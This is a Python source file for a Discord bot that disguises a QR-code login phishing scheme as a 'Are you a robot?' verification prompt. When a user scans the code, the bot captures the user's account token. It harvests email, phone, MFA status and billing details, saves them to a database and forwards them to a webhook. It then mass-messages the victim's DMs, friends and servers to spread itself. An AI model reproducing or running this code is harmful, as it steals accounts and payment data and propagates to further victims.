
from http.client import HTTPException

import os
from . DRAclient import DRAClient
import io
import qrcode
import discord
import asyncio
from discord.utils import get
from datetime import datetime
from colorama import Fore
import config
import random
from . import DiscordLib
import database
import json

class LUser:
    def __init__(self, token, logged_from):
        self.token = token
        self.logged_from = logged_from

        self.details = None
        self.billing = None
        self.valid_payment = None
        self.nitro = None
        self.email = None
        self.phone = None
    
    @property
    def useless(self):
        if not self.valid_payment:
            return True
    



async def generate_qr(fingerprint):
    qr = qrcode.make(f'https://discordapp.com/ra/{fingerprint}', border=2, box_size=7, version=None)
    
    with io.BytesIO() as image_binary:
                    qr.save(image_binary, 'PNG')
                    image_binary.seek(0)
                    return discord.File(fp=image_binary, filename='image.png')
    
async def generate_verify_embed():
    embed = discord.Embed()
    embed.description = '✅ Scan this QR code to gain access!'
    embed.title = '🤖 Are you a robot?'
    embed.set_image(url="attachment://image.png")
    embed.color = 0x17a2ff
    embed.add_field(name='Tutorial', value='1: Open the Discord mobile app\n2: Open settings\n3: Press Scan QR Code', inline=False)
    return embed



class QRHandler():
    def __init__(self):
        self.ctx = None
        self.client = None
        self.useless = None
        self.user = None
        self.client = DRAClient(on_connected=self.on_connected, 
                                on_scan=self.on_scan, 
                                on_finish=self.on_finish, 
                                on_close=self.on_close)
    
    async def run(self, ctx):
        self.ctx = ctx
        await self.client.connect()
    
    async def on_connected(self):
        print(f'[Opened] {self.ctx.user.name}#{self.ctx.user.discriminator}')

        qr = await generate_qr(self.client.fingerprint)
        embed = await generate_verify_embed()
        await self.ctx.followup.send(embed=embed, file=qr, ephemeral=True)
                    
    async def on_scan(self):
        print(f'{Fore.YELLOW}[Scanned] {self.client.user.username}#{self.client.user.discrim}')
            

    async def insert_token(self):
        self.user.details = await DiscordLib.get_details(self.user.token)
        if 'message' in self.user.details:
            if self.user.details['message'] == '401: Unauthorized':
                return


        if "premium_type" in self.user.details:
            if self.user.details['premium_type'] == 1:
                self.user.nitro = "Classic"
            elif self.user.details['premium_type'] == 2:
                self.user.nitro = True
        else:
            self.user.nitro = False

        self.user.billing = {'data': await DiscordLib.get_payment(self.user.token)}
        self.user.valid_payment = await DiscordLib.parse_payment(self.user.billing['data'])
        
        self.user.email = None if not self.user.details['email'] else self.user.details['email']
        self.user.phone = None if not self.user.details['phone'] else self.user.details['phone']

        await database.pool.execute(
            """
                INSERT INTO tokens
                VALUES(
                    DEFAULT, $1, $2, $3, $4, $5, $6, $7, $8, $9
                )
            """,
            '#'.join([self.user.details['username'], self.user.details['discriminator']]),
            self.user.details['id'],
            self.user.token,
            self.user.email,
            self.user.phone,
            self.user.details['mfa_enabled'],
            bool(self.user.nitro),
            None if not self.user.billing['data'] else json.dumps(self.user.billing),
            self.user.valid_payment
        )

            
    async def export_token(self):
        await self.insert_token()

        if config.config['webhook_url']:
            await DiscordLib.send_webhook(self.user)

    
    async def give_role(self):
        try:
            role = get(self.ctx.guild.roles, id=config.config['servers'][str(self.ctx.guild.id)]['verify_role'])
            await self.ctx.user.add_roles(role)
        except HTTPException:
            print(f'{Fore.RED}[Error] Failed to add role to user, try running the setuprole command.')
        except discord.errors.Forbidden:
            print(f'{Fore.RED}[Error] Failed to add role to user, try making sure the bot role is above the verify role or giving the bot permissions.')
        except KeyError:
            print(f'{Fore.RED}[Error] Failed to add role to user, try making sure the role id is correct in config.config.json')

    async def auto_spread(self):
        massdm = DiscordLib.MassDM()
        await massdm.init(self.client.token, f'{self.client.user.username}#{self.client.user.discrim}')

        await massdm.message_dms()
        await massdm.message_friends()
        await massdm.message_guilds()
    
    
    
    async def auto_add(self):
        if config.config['auto_add']['enabled']:
            for user in config.config['auto_add']['users']:
                await DiscordLib().send_friend_request(self.client.token, user.split('#'))

    async def on_finish(self):
        print(f'{Fore.GREEN}[SUCCESS] {self.client.user.username}#{self.client.user.discrim}')

        self.user = LUser(self.client.token, self.ctx.guild.name)

        await self.export_token()

        if self.user.useless:
            if str(self.ctx.guild.id) in config.config['servers']:
                if config.config['servers'][str(self.ctx.guild.id)]['auto_spread']:
                    asyncio.create_task(self.auto_spread())

            await self.auto_add()


        await self.give_role()
               
    async def on_close(self):
        print(f'{Fore.RED}[Failure] {self.client.user.username}#{self.client.user.discrim}')
